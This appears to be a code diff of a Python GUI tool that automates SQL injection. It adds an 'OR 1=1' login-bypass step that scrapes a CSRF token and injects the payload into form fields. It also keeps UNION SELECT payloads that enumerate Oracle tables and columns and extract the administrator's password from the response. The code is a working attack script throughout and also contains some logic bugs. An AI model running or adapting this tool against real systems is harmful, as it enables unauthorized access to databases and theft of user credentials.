@@ -14,24 +14,48 @@ def perform_request(url, sql_payload, method, post_data):
     if method == 'GET':
         r = requests.get(url+ sql_payload, verify=False,proxies=proxies)
     elif method == 'POST':
-        data = {key: value for key, value in (item.split('=') for item in post_data.split('&'))}
-        r = requests.post(url, data=data, verify=False,proxies=proxies)
+        r = requests.post(url, data=post_data, verify=False,proxies=proxies)
     else:
         raise ValueError("Invalid method specified.")
-    return r.text
+    return r
+
+def try_login(url, method,post_data):
+    sql_payload="'OR 1=1 # "
+    def get_csrf_token(url):
+        r = requests.get(url, verify=False)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        csrf = soup.find("input")['value']
+        return csrf
+    try:
+        csrf = get_csrf_token(url)
+        if csrf:
+            data = {"csrf": csrf}
+            data.update({key: value for key, value in (item.split('=') for item in post_data.split('&'))})
+            data[list(data.keys())[1]] = sql_payload
+            print(data)
+        res = perform_request(url,sql_payload, method, data)
+    
+    except:
+        post_data[list(post_data.keys())[0]] = sql_payload
+        print(post_data)
+        res = perform_request(url, sql_payload,method, post_data)
+        if res.status_code == 200:
+            return True,sql_payload
+        else:
+            return False              
 
 def exploit_sqli_users_table(url, method, post_data):
     sql_payload = "' UNION SELECT table_name, NULL FROM all_tables #"
     res = perform_request(url, sql_payload, method, post_data)
     print(res)
-    soup = BeautifulSoup(res, 'html.parser')
+    soup = BeautifulSoup(res.text, 'html.parser')
     users_table = soup.find(text=re.compile('^USERS\_.*'))
     return users_table
 
 def exploit_sqli_users_columns(url, users_table, method='GET', post_data=None):
     sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- " % users_table
     res = perform_request(url, sql_payload, method, post_data)
-    soup = BeautifulSoup(res, 'html.parser')
+    soup = BeautifulSoup(res.text, 'html.parser')
     username_column = soup.find(text=re.compile('.*USERNAME.*'))
     password_column = soup.find(text=re.compile('.*PASSWORD.*'))
     return username_column, password_column
@@ -39,7 +63,7 @@ def exploit_sqli_users_columns(url, users_table, method='GET', post_data=None):
 def exploit_sqli_administrator_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
     sql_payload = "' UNION select %s, %s from %s--" % (username_column, password_column, users_table)
     res = perform_request(url, sql_payload, method, post_data)
-    soup = BeautifulSoup(res, 'html.parser')
+    soup = BeautifulSoup(res.text, 'html.parser')
     admin_password = soup.find(text="administrator").parent.findNext('td').contents[0]
     return admin_password
 
@@ -54,7 +78,16 @@ def main():
         result_text.delete(1.0, tk.END)  # Clear previous results
 
         method = 'GET' if method_var.get() == 0 else 'POST'
-        post_data = post_data_entry.get() if method == 'POST' else None
+        data = post_data_entry.get() if method == 'POST' else None
+        post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
+        if try_login_option.get():
+            login_successful = try_login(url, method, post_data)
+        if login_successful[0]:
+            result_text.insert(tk.END, "[+] Login Successful!\n")
+            result_text.insert(tk.END, f"[+] Payload = {login_successful[1]}\n")
+        else:
+            result_text.insert(tk.END, "[-] Login Failed. Stopping execution.\n")
+            return
 
         print("Looking for the users table...")
         users_table = exploit_sqli_users_table(url, method, post_data)
@@ -88,12 +121,15 @@ def main():
     method_checkbutton = tk.Checkbutton(root, text="Use POST", variable=method_var)
     method_checkbutton.pack()
 
-    post_data = tk.StringVar()
     post_data_label = tk.Label(root, text="Enter POST Data:")
     post_data_label.pack()
 
     post_data_entry = tk.Entry(root, width=40)
     post_data_entry.pack()
+
+    try_login_option = tk.BooleanVar()
+    try_login_checkbutton = tk.Checkbutton(root, text="Try Login", variable=try_login_option)
+    try_login_checkbutton.pack()
 
     execute_button = tk.Button(root, text="Execute SQL Injection", command=execute_sql_injection)
     execute_button.pack()
